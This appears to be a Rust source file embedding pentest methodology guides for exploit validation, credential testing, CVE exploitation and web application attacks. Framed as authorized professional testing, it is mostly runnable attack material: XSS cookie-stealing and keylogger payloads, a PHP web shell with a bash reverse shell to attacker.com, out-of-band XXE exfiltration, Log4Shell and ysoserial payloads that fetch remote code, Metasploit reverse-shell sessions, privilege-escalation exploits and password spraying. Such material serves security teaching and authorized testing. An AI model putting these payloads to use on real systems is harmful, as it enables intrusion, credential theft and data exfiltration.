pub const EXPLOITATION_STEPS: &[(&str, &str)] = &[
    (
        "Safe exploit validation",
        "OBJECTIVE: Verify identified vulnerabilities through controlled proof-of-concept exploitation while minimizing risk of system damage or service disruption.

ACADEMIC BACKGROUND:
This step aligns with PTES Technical Guidelines Section 3.6 (Exploitation) and OWASP Testing Guide principles of controlled testing. MITRE ATT&CK Initial Access tactics (T1190) and Execution tactics (T1059) document exploitation techniques. NIST SP 800-115 Section 8.1 emphasizes safe exploitation methodology. The rules of engagement and scope documents define acceptable exploitation boundaries per PCI DSS penetration testing guidance.

STEP-BY-STEP PROCESS:

1. Pre-Exploitation Risk Assessment:
```bash
# Document vulnerability details:
echo \"Vulnerability: Apache 2.4.49 Path Traversal (CVE-2021-41773)
Target: webserver01.target.com:80
Impact: File disclosure, potential RCE
Exploit Availability: Public (Metasploit, ExploitDB)
Risk Level: MEDIUM (read-only file access, no write/execute)
Mitigation: Verify in isolated VM first
Rollback: No persistence, read-only operation
Authorization: Written approval from CTO dated 2025-11-01\" > exploitation_plan.txt

# Classify exploitation risks:
# LOW: Information disclosure, read-only file access
# MEDIUM: Write access, configuration changes (reversible)
# HIGH: Code execution, service interruption, data modification
# CRITICAL: Destructive operations, irreversible changes
```

2. Lab Environment Validation:
```bash
# Create isolated test environment:
# Deploy vulnerable application in Docker/VM:
docker run -d -p 8080:80 vulnerables/cve-2021-41773

# Test exploit in lab first:
curl --path-as-is 'http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# Verify exploit behavior:
# - Success indicators (file contents returned)
# - Failure modes (error messages, crashes)
# - Side effects (log entries, service impact)
# - Cleanup requirements

# Document lab results:
echo \"Lab Test Results:
Exploit: CVE-2021-41773 PoC
Success: YES - /etc/passwd retrieved
Side Effects: Access log entry only
Service Impact: None
Cleanup: No artifacts created
Safe for Production: YES\" > lab_validation.txt
```

3. Production Exploitation Planning:
```bash
# Define exploitation scope and limits:
# - Target systems (specific IPs/hostnames only)
# - Allowed actions (read-only, no modifications)
# - Forbidden actions (no data exfiltration of PII, no service disruption)
# - Time windows (business hours vs off-hours)
# - Escalation procedures if issues arise

# Create exploitation checklist:
echo \"Pre-Exploitation Checklist:
[ ] Written authorization obtained
[ ] Backup verification completed
[ ] Change control ticket filed
[ ] Monitoring team notified
[ ] Rollback procedure documented
[ ] Emergency contacts verified
[ ] Lab testing successful\" > exploitation_checklist.txt

# Prepare monitoring:
# Monitor target system resources during exploitation:
# - CPU usage
# - Memory consumption
# - Disk I/O
# - Network traffic
# - Service availability
```

4. Controlled Exploitation Execution:
```bash
# Execute with safety checks:
# Start with least invasive techniques
# Monitor system behavior continuously
# Stop immediately if unexpected behavior occurs

# Example safe SQL injection (read-only):
sqlmap -u \"https://target.com/page?id=1\" \\
  --batch \\
  --technique=B \\  # Blind SQL injection (less invasive)
  --no-cast \\      # Avoid type conversions that could cause errors
  --skip-waf \\     # Avoid triggering security controls
  --current-db \\   # Only enumerate database name
  --threads=1 \\    # Single thread to avoid DoS
  --delay=2         # 2-second delay between requests

# Example safe command injection validation:
# Test with harmless commands first:
curl \"https://target.com/ping?host=127.0.0.1;whoami\"  # Read-only system info
# Avoid: rm, dd, :(){ :|:& };:, shutdown commands

# Example safe file inclusion:
# Read non-sensitive files first:
curl \"https://target.com/view?file=../../../../etc/hostname\"  # Hostname only
curl \"https://target.com/view?file=../../../../etc/issue\"     # OS version
# Escalate to /etc/passwd only if necessary for PoC
```

5. Evidence Collection During Exploitation:
```bash
# Screenshot capture:
# Use scrot, gnome-screenshot, or browser dev tools
scrot -s exploitation_poc.png

# Network traffic capture:
tcpdump -i eth0 -w exploitation.pcap \"host target.com and port 443\"
# Later analyze with: tshark -r exploitation.pcap

# Command output preservation:
script -c \"sqlmap -u 'https://target.com/page?id=1' --batch --dbs\" exploitation_transcript.txt

# Burp Suite request/response export:
# Right-click request â†’ Save item

# Video recording for complex exploits:
recordmydesktop -o exploitation_demo.ogv
# Or use: asciinema for terminal recordings
asciinema rec exploitation.cast
```

6. Proof-of-Concept Development:
```bash
# Create reliable, repeatable PoC scripts:
cat > poc_sqli.py << 'EOF'
#!/usr/bin/env python3
import requests

# SQL injection PoC for target.com
# CVE: N/A (custom application)
# Impact: Database enumeration
# Risk: LOW (read-only)

def exploit():
    url = \"https://target.com/search\"
    payload = \"' UNION SELECT table_name,null FROM information_schema.tables--\"
    
    response = requests.post(url, data={\"q\": payload})
    
    if \"users\" in response.text:
        print(\"[+] SQL injection confirmed\")
        print(\"[+] Tables enumerated:\", response.text)
        return True
    else:
        print(\"[-] Exploitation failed\")
        return False

if __name__ == \"__main__\":
    exploit()
EOF
chmod +x poc_sqli.py

# Test PoC reliability (3+ successful runs):
for i in {1..3}; do
    echo \"Test run $i:\"
    python3 poc_sqli.py
    sleep 5
done
```

7. Impact Verification:
```bash
# Verify exploitation impact matches expectations:
# For SQLi: Can enumerate databases, tables, extract data
# For XSS: Can execute JavaScript in victim browser
# For RCE: Can execute system commands with specific privileges
# For LFI: Can read files with web server user permissions

# Document actual vs expected impact:
echo \"Impact Assessment:
Expected: Read /etc/passwd via path traversal
Actual: Successfully read /etc/passwd (10 user accounts)
Privilege Level: www-data (web server user)
Data Accessed: System user list (non-sensitive)
Persistence: None (request-based exploitation)
Lateral Movement Potential: LOW (limited to web server context)\" > impact_assessment.txt
```

8. Rollback and Cleanup Verification:
```bash
# For non-persistent exploits (most web vulnerabilities):
# - No rollback needed
# - Verify no artifacts left on server
# - Check for log entries only

# For persistent exploits (uploaded shells, created accounts):
# Remove uploaded files:
curl -X DELETE https://target.com/uploads/shell.php -H \"Cookie: admin_session\"

# Delete created accounts:
curl -X POST https://target.com/api/users/delete -d \"username=test_exploit\"

# Verify cleanup:
curl https://target.com/uploads/shell.php  # Should return 404
```

9. Stakeholder Notification:
```bash
# Immediate notification for critical findings:
echo \"SECURITY ALERT
Date: 2025-11-01 14:30
Severity: HIGH
Vulnerability: SQL Injection in /search endpoint
Status: VERIFIED via safe exploitation
Impact: Full database read access
Immediate Action Required: Deploy input validation patch
Contact: pentester@example.com\" | mail -s \"Critical Vulnerability Verified\" security-team@target.com

# Document in ticketing system:
# Jira, ServiceNow, or similar
```

10. Exploitation Lessons Learned:
```bash
# Document what worked and what didn't:
echo \"Exploitation Report:
Vulnerabilities Tested: 12
Exploitable: 8
False Positives: 4
Unexpected Behavior: 1 (timeout on large SQLi payload)
Safety Incidents: 0
Recommendations:
- Add rate limiting for future tests
- Lab environment accurately represented production
- Backup verification critical before testing\" > lessons_learned.txt
```

WHAT TO LOOK FOR:
- **Reliable Exploitation**: PoC succeeds consistently (3+ times) without system instability
- **Predictable Impact**: Actual results match expected outcomes from vulnerability analysis
- **No Collateral Damage**: Exploitation doesn't affect other systems or services
- **Clean Rollback**: All changes reversible and artifacts removable
- **Clear Evidence**: Screenshots, logs, traffic captures document successful exploitation
- **Scope Compliance**: Exploitation stays within approved targets and methods
- **Safety Checks Effective**: Monitoring detects any anomalies immediately

SECURITY IMPLICATIONS:
- **Proof of Risk**: Successful exploitation validates business risk assessments
- **Prioritization Driver**: Demonstrated exploits elevate remediation priority
- **Incident Response Test**: Tests detection capabilities and response procedures
- **Compliance Evidence**: Validates security control effectiveness per PCI DSS 11.3, ISO 27001 A.12.6
- **Insurance Requirements**: Some cyber insurance policies require penetration testing validation

COMMON PITFALLS:
- **Unreliable Exploits**: Public exploits may not work against specific versions or configurations
- **Environment Differences**: Production hardening (WAF, IPS, segmentation) not present in staging
- **Timing Sensitivity**: Race conditions and timing-based exploits may fail intermittently
- **Authentication Requirements**: Some exploits require specific authentication states or privileges
- **False Confidence**: Successful exploitation in lab doesn't guarantee production success
- **Destructive Testing**: Always verify exploit is non-destructive before production use
- **Legal Boundaries**: Exceeding scope or authorization can result in criminal liability

TOOLS REFERENCE:
- **Metasploit Framework**: https://github.com/rapid7/metasploit-framework (Exploitation framework)
- **ExploitDB**: https://www.exploit-db.com/ (Public exploit database)
- **Burp Suite**: https://portswigger.net/burp (Web exploitation proxy)
- **SQLMap**: https://github.com/sqlmapproject/sqlmap (Automated SQL injection)
- **Docker**: https://www.docker.com/ (Isolated lab environments)

FURTHER READING:
- PTES Exploitation Guidelines: http://www.pentest-standard.org/index.php/Exploitation
- NIST SP 800-115 Section 8: Security Assessment Execution
- OWASP Testing Guide Exploitation: https://owasp.org/www-project-web-security-testing-guide/
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- PCI DSS Penetration Testing Guidance: https://www.pcisecuritystandards.org/"
    ),
    (
        "Credential testing",
        "OBJECTIVE: Validate discovered credentials, test default passwords, and perform controlled brute-force attacks against authentication mechanisms.

ACADEMIC BACKGROUND:
MITRE ATT&CK T1078 (Valid Accounts) and T1110 (Brute Force) document credential-based access techniques. OWASP Testing Guide WSTG-ATHN-01 covers default credentials testing. NIST SP 800-63B Section 5.1.1 addresses password strength requirements. The PTES Technical Guidelines emphasize credential testing as primary exploitation vector.

STEP-BY-STEP PROCESS:

1. Default Credential Testing:
```bash
# Test common default credentials:
# admin/admin, admin/password, root/toor, admin/Admin123
# Vendor-specific defaults from documentation

# Automated default credential testing:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://target.com

# Common default databases:
# - SecLists: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
# - CIRT.net Default Passwords: https://cirt.net/passwords
# - DefaultCreds-Cheat-Sheet: https://github.com/ihebski/DefaultCreds-cheat-sheet

# Service-specific defaults:
# Tomcat: admin/tomcat, tomcat/tomcat
# Jenkins: admin/password
# Grafana: admin/admin
# PostgreSQL: postgres/postgres
# MongoDB: (no password by default)
```

2. Discovered Credential Validation:
```bash
# Test credentials from reconnaissance:
# - Exposed in public Git repos
# - Found in leaked database dumps
# - Extracted from configuration files
# - Obtained via phishing simulations

# Validate SSH credentials:
ssh user@target.com -p 22

# Test database credentials:
mysql -h target.com -u dbuser -p'password' -e \"SELECT version();\"
psql -h target.com -U postgres -d database -c \"SELECT version();\"

# Web application login:
curl -X POST https://target.com/login \\
  -d \"username=admin&password=discovered_password\" \\
  -c cookies.txt

# API key validation:
curl -H \"Authorization: Bearer <discovered_token>\" https://api.target.com/user/info
```

3. Password Reuse Testing:
```bash
# Test discovered credentials across multiple services:
# If admin@target.com:Password123 works on web portal,
# test same credentials on:
# - SSH (port 22)
# - FTP (port 21)
# - SMB (port 445)
# - RDP (port 3389)
# - VPN gateway
# - Cloud services (AWS, Azure, O365)

# Automated credential spraying:
crackmapexec smb 192.168.1.0/24 -u admin -p Password123
crackmapexec ssh 192.168.1.0/24 -u admin -p Password123
crackmapexec winrm 192.168.1.0/24 -u admin -p Password123
```

4. Brute Force and Password Spraying:
```bash
# Password spraying (avoid account lockouts):
# Use common passwords against many accounts
# - Password123, Welcome2025, CompanyName2024
# - Seasonal passwords: Winter2024!, Fall2024!

# Hydra brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com http-post-form \\
  \"/login:username=^USER^&password=^PASS^:F=Invalid\" -t 4 -w 30

# Medusa brute force:
medusa -h target.com -u admin -P passwords.txt -M ssh -t 1 -f

# NMAP NSE brute force:
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com -p 22

# CrackMapExec for SMB:
crackmapexec smb target.com -u users.txt -p passwords.txt --continue-on-success
```

5. Hash Cracking (Offline Attacks):
```bash
# Extract password hashes:
# - Windows: SAM database, NTDS.dit (Active Directory)
# - Linux: /etc/shadow
# - Web apps: Database dumps
# - Network: NTLM/NTLMv2 captured via Responder

# Hashcat hash cracking:
# NTLM hashes (Windows):
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-512 (Linux /etc/shadow):
hashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (web applications):
hashcat -m 3200 -a 0 web_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
john --show hashes.txt
```

6. Kerberoasting (Active Directory):
```bash
# Request TGS tickets for service accounts:
# Requires domain user credentials

# Using Impacket:
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.com/user:password

# Crack TGS tickets:
hashcat -m 13100 -a 0 tgs_tickets.txt /usr/share/wordlists/rockyou.txt

# Using Rubeus (Windows):
# Rubeus.exe kerberoast /outfile:tickets.txt
```

7. Token and Session Hijacking:
```bash
# Cookie theft via XSS:
# <script>fetch('http://attacker.com/?c='+document.cookie)</script>

# Session fixation exploitation:
# 1. Obtain session ID before authentication
# 2. Victim authenticates with fixed session
# 3. Attacker uses same session ID

# JWT token manipulation:
# Decode, modify claims, re-encode (if signature not verified)
# See Authentication Analysis section for JWT attacks
```

8. Multi-Factor Authentication Bypass:
```bash
# MFA bypass techniques:
# 1. Backup codes (if leaked or weak)
# 2. Remember device feature abuse
# 3. Direct API endpoint access (skip MFA page)
# 4. OAuth token theft
# 5. SMS interception (SIM swapping simulation)
# 6. Push notification fatigue attacks

# Test MFA enforcement:
curl -H \"Cookie: session_without_mfa\" https://target.com/dashboard
# If accessible, MFA bypass confirmed
```

9. Privilege Verification:
```bash
# After successful authentication, verify access level:
# Linux:
whoami
id
sudo -l
groups

# Windows:
whoami /all
net user %username%
net localgroup administrators

# Web application:
curl https://target.com/api/user/me -H \"Cookie: session\"
# Check returned role/permissions in JSON response
```

10. Credential Documentation:
```bash
# Document all validated credentials:
echo \"Credential Testing Results:
Username: admin@target.com
Password: Password123!
Service: Web Portal (https://target.com)
Access Level: Administrator
Privilege: Full system access
Source: Default credentials (unchanged)
Reuse: SSH (port 22) âœ“, FTP (port 21) âœ“
Recommendations: Enforce password change, enable MFA\" > credentials_report.txt
```

WHAT TO LOOK FOR:
- **Default Credentials**: Unchanged vendor passwords providing immediate access
- **Weak Passwords**: Dictionary words, company names, seasonal patterns (Winter2024)
- **Password Reuse**: Same credentials working across multiple services
- **Missing Lockout**: Unlimited authentication attempts without account locks
- **Crackable Hashes**: Weak hashing algorithms (MD5, SHA1) or short passwords
- **MFA Gaps**: Backup methods, remember device, or direct endpoint bypass
- **Service Accounts**: High-privilege accounts with weak or no passwords
- **Shared Accounts**: Generic usernames (admin, test, support) with known passwords

SECURITY IMPLICATIONS:
- **Immediate Access**: Valid credentials provide authorized entry, bypassing most security controls
- **Lateral Movement**: Credential reuse enables access to multiple systems
- **Persistence**: Valid accounts harder to detect than malware or exploits
- **Privilege Escalation**: Admin credentials grant full system control
- **Compliance Violations**: Weak passwords breach PCI DSS 8.2, NIST 800-63B, ISO 27001 A.9.4

COMMON PITFALLS:
- **Account Lockouts**: Aggressive brute-forcing triggers lockout policies
- **Alerting**: Failed authentication attempts generate security alerts
- **Rate Limiting**: Password spraying blocked by rate limits or WAF
- **MFA Enforcement**: Multi-factor authentication blocks credential-only access
- **Intentional Honeypots**: Some weak accounts are monitoring traps
- **Legal Concerns**: Unauthorized access via guessed passwords still illegal

TOOLS REFERENCE:
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra (Network brute force)
- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec (SMB/SSH/WinRM testing)
- **Hashcat**: https://hashcat.net/hashcat/ (Hash cracking)
- **John the Ripper**: https://www.openwall.com/john/ (Password cracking)
- **Impacket**: https://github.com/fortra/impacket (Kerberos and SMB tools)
- **SecLists**: https://github.com/danielmiessler/SecLists (Password lists)

FURTHER READING:
- OWASP Testing Guide WSTG-ATHN: https://owasp.org/www-project-web-security-testing-guide/
- MITRE ATT&CK T1110 Brute Force: https://attack.mitre.org/techniques/T1110/
- NIST SP 800-63B Digital Identity Guidelines: https://pages.nist.gov/800-63-3/
- Password Cracking Best Practices: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions"
    ),
    (
        "CVE exploitation",
        "OBJECTIVE: Exploit identified Common Vulnerabilities and Exposures (CVEs) using public proof-of-concept code and exploitation frameworks.

ACADEMIC BACKGROUND:
MITRE ATT&CK T1203 (Exploitation for Client Execution) and T1210 (Exploitation of Remote Services) document CVE exploitation patterns. NIST SP 800-115 Section 8.2 addresses vulnerability exploitation methodology. The Exploit Prediction Scoring System (EPSS) helps prioritize CVE exploitation likelihood.

STEP-BY-STEP PROCESS:

1. CVE Exploit Research:
```bash
# Search Exploit-DB:
searchsploit Apache 2.4.49
searchsploit --cve CVE-2021-41773
searchsploit --examine exploits/linux/webapps/50383.py

# Metasploit Framework search:
msfconsole -q -x \"search cve:2021-41773\"
msfconsole -q -x \"search type:exploit platform:linux apache\"

# GitHub exploit search:
# https://github.com/search?q=CVE-2021-41773&type=repositories
```

2. Exploit Adaptation and Testing:
```bash
# Download exploit from ExploitDB:
searchsploit -m exploits/linux/webapps/50383.py
# Review code for hardcoded IPs, required modifications

# Test in lab environment first:
python3 50383.py --target http://lab.internal:8080 --command \"id\"

# Metasploit module usage:
msfconsole
use exploit/linux/http/apache_normalize_path_rce
set RHOSTS target.com
set LHOST attacker_ip
set LPORT 4444
check   # Verify vulnerability before exploitation
exploit
```

3. Remote Code Execution (RCE) Exploitation:
```bash
# Log4Shell (CVE-2021-44228):
curl -H \"X-Api-Version: ${jndi:ldap://attacker.com:1389/Exploit}\" https://target.com/api

# Apache Struts (CVE-2017-5638):
# Content-Type: %{(#_='multipart/form-data')...}

# Shellshock (CVE-2014-6271):
curl -H \"User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'\" https://target.com/cgi-bin/test.cgi

# ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207):
# Exploit Microsoft Exchange Server
```

4. Privilege Escalation CVEs:
```bash
# Linux kernel exploits:
# DirtyCOW (CVE-2016-5195):
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password  # Creates firefart user with root privileges

# Sudo vulnerability (CVE-2021-3156 - Baron Samedit):
sudoedit -s /
# Grants root shell on vulnerable sudo versions

# Windows privilege escalation:
# PrintSpooler (CVE-2021-1675 - PrintNightmare):
# Loads malicious DLL as SYSTEM
```

5. Exploit Reliability Testing:
```bash
# Test exploit 3+ times for reliability:
for i in {1..5}; do
    echo \"Attempt $i:\"
    python3 exploit.py --target https://target.com
    sleep 10
done

# Document success rate:
# 5/5 successful: Reliable
# 3/5 successful: Moderate reliability
# 1/5 successful: Unreliable (environment-specific)
```

6. Exploitation with Metasploit Framework:
```bash
# Full Metasploit exploitation workflow:
msfconsole -q

# Search for exploits:
search cve:2021

# Select exploit:
use exploit/multi/http/log4shell_header_injection
show options
set RHOSTS target.com
set LHOST attacker_ip
set LPORT 4444

# Set payload:
set payload linux/x64/meterpreter/reverse_tcp

# Verify target is vulnerable:
check

# Execute exploit:
exploit -j  # Run as job (background)

# Interact with session:
sessions -l
sessions -i 1
```

7. Post-Exploitation Commands:
```bash
# After gaining shell access:
# System information:
uname -a
cat /etc/os-release
whoami
id

# Network reconnaissance:
ifconfig
ip addr
netstat -antup

# Privilege verification:
sudo -l
cat /etc/sudoers

# Persistence (if authorized):
# SSH key installation, cron jobs, systemd services
```

8. Evidence Collection:
```bash
# Capture exploitation proof:
script -c \"msfconsole\" exploitation_session.txt
# Screenshot showing id, uname, and access confirmation

# Network traffic:
tcpdump -i eth0 -w cve_exploitation.pcap \"host target.com\"

# Document exploitation chain:
echo \"CVE Exploitation Report:
CVE: CVE-2021-41773
Vulnerability: Apache Path Traversal
Exploit Source: ExploitDB 50383
Exploit Success: YES (5/5 attempts)
Access Gained: www-data user on webserver01
Commands Executed: id, uname -a, cat /etc/passwd
Persistence: None (session-based only)\" > cve_report.txt
```

9. Failure Analysis:
```bash
# Common exploitation failure reasons:
# - Target not vulnerable (patched or different version)
# - WAF/IPS blocking exploit traffic
# - Network conditions (firewalls, NAT, routing)
# - Exploit requires specific configuration
# - Antivirus/EDR detecting exploit

# Document failures:
echo \"Failed Exploitation Attempts:
CVE: CVE-2019-0708 (BlueKeep)
Target: Windows Server 2019
Result: FAILED - Target patched (KB4499175)
CVE: CVE-2021-44228 (Log4Shell)
Target: Application server
Result: FAILED - WAF blocking JNDI lookups\" > failed_exploits.txt
```

10. Ethical Exploitation Guidelines:
```bash
# Always follow rules of engagement:
# - Only exploit systems in scope
# - Stop immediately if instability detected
# - Don't exfiltrate sensitive data
# - Don't create backdoors without authorization
# - Document all actions for client transparency
```

WHAT TO LOOK FOR:
- **Publicly Available Exploits**: Metasploit modules, ExploitDB entries, GitHub PoCs
- **High-Reliability CVEs**: Exploits that work consistently across versions
- **Remote Code Execution**: Highest impact vulnerabilities providing shell access
- **Privilege Escalation Chains**: Combining user-level RCE with local privesc
- **No User Interaction**: Vulnerabilities exploitable without victim actions
- **Wormable Vulnerabilities**: Self-propagating exploits (EternalBlue, BlueKeep)

SECURITY IMPLICATIONS:
- **Rapid Compromise**: Public CVE exploits enable mass exploitation by threat actors
- **Ransomware Delivery**: RCE vulnerabilities primary vector for ransomware deployment
- **Supply Chain Risk**: Library vulnerabilities (Log4j) affect thousands of applications
- **Compliance Violations**: Unpatched critical CVEs breach PCI DSS 6.2, NIST 800-53 SI-2

COMMON PITFALLS:
- **Exploit Fragility**: Public exploits may be unreliable or crash systems
- **Version Specificity**: Exploits often target specific software versions
- **Detection**: IDS/IPS signatures exist for popular CVE exploits
- **Legal Risk**: Unauthorized CVE exploitation constitutes computer intrusion

TOOLS REFERENCE:
- **Metasploit**: https://github.com/rapid7/metasploit-framework
- **searchsploit**: https://github.com/offensive-security/exploitdb
- **Nuclei**: https://github.com/projectdiscovery/nuclei (CVE detection)
- **PoC-in-GitHub**: https://github.com/nomi-sec/PoC-in-GitHub

FURTHER READING:
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- PTES Exploitation: http://www.pentest-standard.org/index.php/Exploitation
- MITRE ATT&CK Exploitation: https://attack.mitre.org/tactics/TA0002/"
    ),
    (
        "Web application exploitation",
        "OBJECTIVE: Exploit web application vulnerabilities including SQL injection, XSS, file upload flaws, and business logic issues to demonstrate real-world impact.

ACADEMIC BACKGROUND:
This step implements OWASP Top 10:2021 exploitation including A03 (Injection), A01 (Broken Access Control), A04 (Insecure Design). MITRE ATT&CK T1190 (Exploit Public-Facing Application) documents web exploitation tactics. PTES Web Application Testing methodology provides comprehensive exploitation guidance.

STEP-BY-STEP PROCESS:

1. SQL Injection Exploitation for Data Extraction:
```bash
# Manual SQL injection data extraction:
# Enumerate databases:
' UNION SELECT schema_name FROM information_schema.schemata--

# Enumerate tables:
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database'--

# Extract data:
' UNION SELECT username,password FROM users--

# Automated with SQLMap:
sqlmap -u \"https://target.com/product?id=1\" --batch --dump -D database -T users

# Boolean-based blind extraction:
sqlmap -u \"https://target.com/search?q=test\" --batch --technique=B --threads=10

# File read via SQL injection:
' UNION SELECT LOAD_FILE('/etc/passwd')--
sqlmap -u \"https://target.com/page?id=1\" --file-read=\"/var/www/html/config.php\"

# Command execution (if database has permissions):
'; EXEC xp_cmdshell('whoami')--  # MSSQL
' UNION SELECT sys_eval('id')--  # MySQL with UDF
sqlmap -u \"https://target.com/page?id=1\" --os-shell
```

2. Cross-Site Scripting (XSS) Exploitation:
```bash
# Stored XSS for session hijacking:
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie;</script>

# Setup listener on attacker server:
python3 -m http.server 8080

# Keylogger XSS payload:
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>

# BeEF Framework integration:
<script src=\"http://attacker.com:3000/hook.js\"></script>
# Access BeEF control panel: http://localhost:3000/ui/panel

# DOM-based XSS exploitation:
# If page uses: document.location.href = '#' + decodeURIComponent(hash)
https://target.com/page#<script>alert(document.cookie)</script>
```

3. File Upload Exploitation:
```bash
# PHP web shell upload:
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Bypass extension filters:
shell.php.jpg  # Double extension
shell.php%00.jpg  # Null byte injection
shell.phtml, shell.php3, shell.php4, shell.php5  # Alternative extensions

# Upload with curl:
curl -X POST https://target.com/upload -F \"file=@shell.php\" -F \"submit=Upload\"

# Access uploaded shell:
curl \"https://target.com/uploads/shell.php?cmd=id\"

# Reverse shell upgrade:
curl \"https://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\"

# Listener on attacker machine:
nc -lvnp 4444
```

4. XML External Entity (XXE) Exploitation:
```bash
# XXE for file disclosure:
<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>

# Out-of-band XXE (exfiltrate data):
<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>

# evil.dtd on attacker server:
<!ENTITY % file SYSTEM \"file:///etc/passwd\">
<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">
%eval;
%exfiltrate;

# XXE to SSRF (scan internal network):
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">]>
<root>&xxe;</root>
```

5. Server-Side Request Forgery (SSRF):
```bash
# SSRF to access internal services:
# If application fetches URLs: https://target.com/fetch?url=...

# Access internal network:
curl \"https://target.com/fetch?url=http://192.168.1.100\"

# Access cloud metadata (AWS):
curl \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"

# Port scanning via SSRF:
for port in {1..1000}; do
    curl \"https://target.com/fetch?url=http://internal-host:$port\" &
done

# SSRF to RCE (Gopher protocol):
curl \"https://target.com/fetch?url=gopher://localhost:6379/_SET%20test%20command\"
```

6. Local File Inclusion (LFI) to Remote Code Execution:
```bash
# LFI with PHP wrappers:
# Log poisoning:
# 1. Inject PHP code into access.log via User-Agent:
curl -A \"<?php system($_GET['cmd']); ?>\" https://target.com

# 2. Include log file:
curl \"https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id\"

# PHP session file inclusion:
# 1. Store PHP code in session:
curl \"https://target.com/index.php?lang=en\" --cookie \"PHPSESSID=malicious\" -d \"username=<?php system('id'); ?>\"

# 2. Include session file:
curl \"https://target.com/page?file=../../../../tmp/sess_malicious\"

# /proc/self/environ inclusion:
curl \"https://target.com/page?file=../../../../proc/self/environ\" -H \"User-Agent: <?php system('id'); ?>\"
```

7. Insecure Deserialization Exploitation:
```bash
# PHP object injection:
# Serialized object: O:4:User:1:{s:4:role;s:5:admin;}
# Base64 encoded value

# Java deserialization (ysoserial):
java -jar ysoserial.jar CommonsCollections5 'wget http://attacker.com/shell.sh | bash' | base64

# Python pickle injection demonstrates RCE via deserialization
# Creates exploit object that executes system commands when unpickled
```

8. Business Logic Exploitation:
```bash
# Price manipulation:
# POST /checkout
# {\"product_id\": 123, \"quantity\": 1, \"price\": 0.01}

# Workflow bypass:
# Skip payment step, go directly to order confirmation:
curl -X POST https://target.com/order/confirm -d \"order_id=12345\"

# Race condition exploitation (parallel processing):
# Transfer funds twice simultaneously:
curl -X POST https://target.com/api/transfer -d \"to=attacker&amount=1000\" &
curl -X POST https://target.com/api/transfer -d \"to=attacker&amount=1000\" &

# Discount code stacking:
curl -X POST https://target.com/apply-discount \\
  -d \"code=SAVE10&code=SAVE20&code=SAVE30\"
```

9. Authentication and Authorization Bypass:
```bash
# SQL injection authentication bypass:
# username: admin'--
# password: anything
curl -X POST https://target.com/login -d \"username=admin'--&password=test\"

# JWT manipulation (algorithm confusion):
# Change header: {\"alg\":\"RS256\"} â†’ {\"alg\":\"none\"}
# Remove signature, access admin resources

# IDOR exploitation:
curl https://target.com/api/invoice/100 -H \"Cookie: user_session\"
curl https://target.com/api/invoice/101 -H \"Cookie: user_session\"  # Access other user's data

# Forced browsing:
curl https://target.com/admin/  # 403 Forbidden
curl -X POST https://target.com/admin/  # 200 OK (HTTP method bypass)
```

10. Command Injection via Web Forms:
```bash
# Inject commands in web forms:
# Vulnerable parameter: ping -c 4 <user_input>
curl \"https://target.com/ping?host=127.0.0.1;cat%20/etc/passwd\"
curl \"https://target.com/ping?host=127.0.0.1%26%26whoami\"
curl \"https://target.com/ping?host=127.0.0.1|ls%20-la\"

# Blind command injection (time-based):
curl \"https://target.com/diagnostics?cmd=test;sleep%2010\"
# If response takes 10 seconds, command injection confirmed

# Out-of-band command injection:
curl \"https://target.com/diagnostics?cmd=test;curl%20http://attacker.com/$(whoami)\"
# Check attacker.com logs for exfiltrated data
```

WHAT TO LOOK FOR:
- **SQL Injection**: Database errors, UNION-based extraction, blind boolean/time-based queries
- **XSS**: JavaScript execution in browser, cookie theft, DOM manipulation
- **File Upload**: Unrestricted file types, webshell access, remote code execution
- **XXE**: File disclosure, SSRF via XML, out-of-band data exfiltration
- **SSRF**: Access to internal services, cloud metadata, port scanning
- **LFI/RFI**: Local file disclosure, log poisoning, remote code inclusion
- **Business Logic**: Payment bypass, workflow skipping, race conditions
- **Insecure Deserialization**: Object injection, RCE via serialized data
- **Command Injection**: System command execution, blind/out-of-band verification

SECURITY IMPLICATIONS:
- **Data Breach**: SQL injection and file disclosure expose sensitive data
- **Account Takeover**: XSS and authentication bypass compromise user accounts
- **Remote Code Execution**: File upload and command injection provide server access
- **Financial Fraud**: Business logic flaws enable payment bypass and price manipulation
- **Compliance Violations**: Web vulnerabilities breach OWASP ASVS, PCI DSS 6.5, ISO 27001 A.14.2

COMMON PITFALLS:
- **WAF Blocking**: Web Application Firewalls detect and block common payloads
- **Input Validation**: Modern frameworks implement input sanitization
- **CSP Headers**: Content Security Policy prevents XSS execution
